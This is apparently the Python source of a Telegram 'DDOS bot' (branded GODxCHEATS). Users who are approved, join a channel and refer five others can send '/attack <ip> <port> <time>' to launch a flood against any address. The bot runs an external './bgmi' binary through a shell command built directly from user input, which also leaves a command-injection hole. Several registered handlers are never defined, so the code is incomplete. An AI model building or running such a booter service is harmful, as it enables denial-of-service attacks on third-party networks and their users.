import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os

# Configuration
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"  # Fetch token from environment variable
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@gosjsisnsnsnsjan"  # Replace with your channel username
ATTACK_IN_PROGRESS = False

REFERRAL_FILE = 'referrals.txt'  # File to track referrals
REFERRAL_THRESHOLD = 5  # Number of referrals needed to unlock bot usage

# Load and Save Referral Data
def load_referrals():
    """Load the referral data from a file."""
    try:
        with open(REFERRAL_FILE, 'r') as file:
            return {line.split(":")[0].strip(): int(line.split(":")[1].strip()) for line in file.readlines()}
    except FileNotFoundError:
        return {}

def save_referrals():
    """Save the referral data to a file."""
    with open(REFERRAL_FILE, 'w') as file:
        for user, count in referrals.items():
            file.write(f"{user}:{count}\n")

referrals = load_referrals()

# Load and Save Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check if user has 5 referrals
async def has_enough_referrals(user_id: int):
    """Check if the user has at least 5 referrals."""
    return referrals.get(str(user_id), 0) >= REFERRAL_THRESHOLD

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands.\n\n"
        "*Share the channel link with 5 users to unlock bot usage.*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/alluser - List all approved users and groups (admin only).\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
        "/referral - Check your referral progress.\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved, a channel member, and has 5 referrals."""
    global ATTACK_IN_PROGRESS

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if not await has_enough_referrals(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to refer 5 users to use this bot.*", parse_mode='Markdown')
        return

    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    if ATTACK_IN_PROGRESS:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args

    # Notify user that the attack is starting
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Starting*\n\n"
        f"🎯 *Target IP*: {ip}\n"
        f"🔌 *Port*: {port}\n"
        f"⏱ *Duration*: {time} seconds\n"
        f"🛠 Attack is now in progress. Please wait..."
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global ATTACK_IN_PROGRESS
    ATTACK_IN_PROGRESS = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",  # Example attack command
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

        if process.returncode == 0:
            await context.bot.send_message(chat_id=chat_id, text="*✅ The attack has completed successfully!*\n\nThank you for using the bot.", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ The attack encountered an error and couldn't complete.*", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        ATTACK_IN_PROGRESS = False

        # Notify the attack has finished
        await context.bot.send_message(chat_id=chat_id, text=(
            "*💥 Attack Finished! 💥*\n"
            "*🎯 Target: {ip}\n"
            "*🔌 Port: {port}\n"
            "*⏱ Duration: {time} seconds\n"
            "*💣 Attack process is completed. We hope it was effective!*\n"
            "*♥️ Please leave feedback if you found it useful!*"
        ), parse_mode='Markdown')

async def referral(update: Update, context: CallbackContext):
    """Show the user's referral progress."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    referrals_count = referrals.get(str(user_id), 0)
    await context.bot.send_message(chat_id=chat_id, text=f"*Referral Progress*\nYou have referred {referrals_count} users. You need {REFERRAL_THRESHOLD - referrals_count} more to unlock bot usage.", parse_mode='Markdown')

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("alluser", alluser))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("referral", referral))

    application.run_polling()

if __name__ == '__main__':
    main()